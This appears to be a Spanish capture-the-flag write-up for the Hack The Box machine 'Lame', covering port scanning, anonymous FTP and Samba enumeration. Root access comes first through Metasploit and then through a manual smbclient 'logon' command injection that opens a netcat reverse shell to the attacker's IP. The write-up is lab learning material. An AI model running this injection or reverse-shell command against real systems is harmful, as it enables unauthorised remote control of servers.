# Lame

```bash
sudo nmap -p- --open -sCV --min-rate=5000 -n 10.129.38.223 -oN nmapResult.txt
```

![](../../assets/img/Pasted_image_20260519155256.png)

- Conseguimos acceder al ftp con anonymous pero no hay nada en el directorio

![](../../assets/img/Pasted_image_20260519155936.png)

- El comando
```bash
wget -m ftp://anonymous:anonymous@10.129.38.223
```

Descarga todo lo que hay de forma recursiva, pero trae una carpeta efectivamente vacía

- Para el resto de puertos

![](../../assets/img/Pasted_image_20260519161832.png)

- Buscamos vulnerabilidades *Samba 3.0.2*

![](../../assets/img/Pasted_image_20260519160808.png)

- Encontramos un script en python para esta versión de Samba llamado **samba_usermap_script.py**
-
```python
python3 -m venv venv
```

-
```python
source venv/bin/activate
```

- Al final  elimino el venv y lo hago instalando
```bash
sudo apt install python3-smb
```

- Probamos con el de metasploit *multi/samba/usermap_script*

![](../../assets/img/Pasted_image_20260519165612.png)

root

----OTRA FORMA----
```bash
smbclient -L 10.129.38.223
```

Conseguimos listar el contenido del recurso compartido

![](../../assets/img/Pasted_image_20260519170924.png)

Intentaremos conectarnos por ejemplo al recurso *tmp*
```bash
smbclient //10.129.38.223/tmp
```

![](../../assets/img/Pasted_image_20260519171139.png)

Conseguimos entrar con nullsession

Ahora inspeccionando el script de rubi de metasploit vemos que lo que hace es una especie de login con */=nohup*, esto es para la persistencia de la shell cuando se envía, antes de que nos mate la sesión
- script ->

![](../../assets/img/Pasted_image_20260519171919.png)

- Usamos *help* para buscar un comando con el que logearnos -> **logon**

![](../../assets/img/Pasted_image_20260519171328.png)

Y hacemos lo que nos dice el script

![](../../assets/img/Pasted_image_20260519172015.png)

- Hacemos **logon "/=\`nohup ping -c 1 10.10.15.36\`"** poniendonos a la escucha de trazas icmp y en password escribimos lo que sea o en blanco

![](../../assets/img/Pasted_image_20260519172324.png)

Se ejecuta el comando

- Nos lanzamos una bash con *nc*
```bash
nc -nlvp 443
```

**logon "/=\`nohup nc -e /bin/bash 10.10.15.36 443\`"**

![](../../assets/img/Pasted_image_20260519172905.png)

root
